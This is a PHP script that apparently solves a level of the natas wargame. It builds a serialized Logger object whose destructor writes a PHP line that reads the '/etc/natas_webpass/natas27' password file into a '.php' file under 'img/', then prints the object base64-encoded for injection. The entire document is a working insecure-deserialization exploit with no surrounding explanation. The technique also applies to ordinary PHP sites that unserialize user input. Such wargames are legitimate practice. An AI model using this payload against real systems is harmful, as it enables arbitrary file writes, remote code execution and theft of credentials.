<?php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;
  
    function __construct($file){

        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27');";
        $this->logFile = $file . ".php";
  
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$initMsg);
        fclose($fd);
    }                       
  
    function log($msg){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$msg."\n");
        fclose($fd);
    }                       
  
    function __destruct(){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->exitMsg);
        fclose($fd);
    }                       
}

$ff = new Logger('img/abhay');
echo base64_encode(serialize($ff));

